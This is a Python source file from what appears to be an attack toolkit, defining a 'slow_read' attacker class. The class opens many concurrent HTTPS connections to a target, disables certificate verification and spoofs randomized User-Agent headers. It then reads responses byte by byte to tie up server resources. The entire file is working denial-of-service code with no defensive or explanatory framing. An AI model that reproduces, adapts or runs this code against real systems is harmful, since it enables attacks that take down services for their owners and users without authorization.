import asyncio
import random
import ssl
from typing import Any

import aiohttp
import structlog

from attack.base import BaseAttacker

logger = structlog.get_logger(__name__)


class SlowReadAttack(BaseAttacker):
    name = "slow_read"
    description = "Slow Read attack: sends complete HTTP requests but reads responses very slowly"

    async def run(
        self,
        target: str,
        port: int = 443,
        connections: int = 100,
        read_delay: float = 5.0,
        **kwargs: Any,
    ) -> None:
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(limit=0, ssl=ssl_context, force_close=False)
        timeout = aiohttp.ClientTimeout(total=None, sock_read=None)
        client = aiohttp.ClientSession(connector=connector, timeout=timeout)

        async def slow_read() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                try:
                    async with client.get(
                        target,
                        headers={"Accept-Encoding": "gzip, deflate", "User-Agent": f"Mozilla/{random.randint(5, 120)}.0"},
                    ) as resp:
                        chunk_iter = resp.content.iter_chunked(1)
                        async for _ in chunk_iter:
                            await asyncio.sleep(read_delay / 10)
                            self.session.stats.bytes_received += 1
                            if self.session.is_stopped:
                                break
                    self.session.stats.packets_sent += 1
                except Exception:
                    self.session.stats.errors += 1
                await asyncio.sleep(0.1)

        tasks = [asyncio.create_task(slow_read()) for _ in range(connections)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await client.close()
